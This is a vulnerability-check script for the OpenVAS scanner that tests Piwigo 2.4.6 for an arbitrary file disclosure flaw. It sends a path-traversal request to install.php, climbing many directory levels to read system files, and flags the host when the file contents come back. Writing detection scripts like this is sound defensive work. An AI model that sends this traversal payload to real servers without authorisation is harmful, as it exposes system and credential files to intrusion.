###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_piwigo_58016.nasl 11 2013-10-27 10:12:02Z jan $
#
# Piwigo Arbitrary File Disclosure and Arbitrary File Deletion Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Piwigo is prone to an arbitrary file-disclosure vulnerability and an
arbitrary file-deletion vulnerability because the application fails to
sanitize user-supplied input.

An attacker can exploit these vulnerabilities to view arbitrary files
on the affected computer and to delete arbitrary files within the
context of the affected application. Other attacks are also possible.

Piwigo 2.4.6 is vulnerable; other versions may also be affected.";


tag_solution = "Updates are available. Please see the references or vendor advisory
for more information.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103670";

if (description)
{
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
   script_tag(name : "solution" , value : tag_solution);
     script_tag(name : "summary" , value : tag_summary);
 }
 script_oid(SCRIPT_OID);
 script_bugtraq_id(58016);
 script_version ("$Revision: 11 $");
 script_tag(name:"cvss_base", value:"7.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");

 script_name("Piwigo Arbitrary File Disclosure and Arbitrary File Deletion Vulnerabilities");

desc = "
   Summary:
   " + tag_summary + "
 Solution:
 " + tag_solution;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/58016");
 script_xref(name : "URL" , value : "http://piwigo.org");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
 script_tag(name:"creation_date", value:"2013-02-26 14:16:03 +0100 (Tue, 26 Feb 2013)");
 script_description(desc);
 script_summary("Determine if it is possible to read a local file");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/piwigo",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = dir + '/install.php?dl=/../../../../../../../../../../../../../../' + files[file]; 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
}
exit(0);

